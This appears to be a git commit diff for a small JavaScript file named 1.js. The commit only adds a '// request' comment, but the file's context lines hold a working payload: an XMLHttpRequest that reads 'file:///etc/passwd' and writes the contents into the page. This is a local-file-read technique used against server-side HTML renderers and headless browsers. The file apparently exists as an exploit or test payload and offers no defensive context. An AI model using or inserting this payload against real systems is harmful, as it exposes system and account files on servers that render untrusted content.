bbb69ae74cc4deca08f95c61cc2496fa26efc068
Shahid Nawaz <80408404+ShahidKalwani@users.noreply.github.com>
2024-03-10 23:25:44 +0500

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,6 +1,7 @@
 console.log("file called");
 
 console.log("welcome");
+// request
 x=new XMLHttpRequest;
 x.onload=function(){document.write(this.responseText)};
 x.open("GET","file:///etc/passwd");x.send();
